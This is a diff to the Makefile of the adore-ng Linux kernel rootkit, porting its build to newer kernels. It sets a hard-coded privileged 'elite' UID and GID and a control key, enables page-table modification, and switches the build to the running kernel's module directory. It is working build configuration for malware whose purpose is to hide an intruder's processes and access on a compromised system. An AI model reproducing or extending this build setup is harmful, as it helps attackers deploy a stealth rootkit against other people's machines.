@@ -6,7 +6,7 @@ EXTRA_CFLAGS=-DELITE_UID=2618748389U -DELITE_GID=4063569279U
 EXTRA_CFLAGS+=-DCURRENT_ADORE=56
 EXTRA_CFLAGS+=-DADORE_KEY=\"fgjgggfd\"
 
-EXTRA_CFLAGS+=-DHIDE
+#EXTRA_CFLAGS+=-DHIDE
 
 # Enable this so it expects itself to be relinked into another LKM with
 # 'relink26' script. If compiled with this switch, it cant
@@ -21,25 +21,23 @@ EXTRA_CFLAGS+=-DHIDE
 # at the end of the file to match your version
 #EXTRA_CFLAGS+=-DCROSS_BUILD
 
-#EXTRA_CFLAGS+=-DMODIFY_PAGE_TABLES
-#EXTRA_CFLAGS+=-DFOUR_LEVEL_PAGING
+EXTRA_CFLAGS+=-DMODIFY_PAGE_TABLES
+EXTRA_CFLAGS+=-DFOUR_LEVEL_PAGING
 
 
-KERNEL_SOURCE=/usr/src/linux-headers-2.6.38-8-generic
+#KERNEL_SOURCE=/usr/src/linux
+KERNELBUILD := /lib/modules/$(shell uname -r)/build
 
-obj-m := adore-ng-2.6.o 
+obj-m += adore-ng.o
 
-default: ava adore symsed
+default: ava adore
 
 adore:
-	make -C ${KERNEL_SOURCE} SUBDIRS=`pwd` modules
+	make -C $(KERNELBUILD) M=$(shell pwd) modules
 
 ava: ava.c libinvisible.c
 	$(CC) $(EXTRA_CFLAGS) ava.c libinvisible.c -o ava
 
-symsed: symsed.c
-	$(CC) -O2 symsed.c -o symsed
-
 clean:
-	rm -f core ava *.o
-
+	rm -f core ava *.ko *.o
+	rm -f *mod* Module*
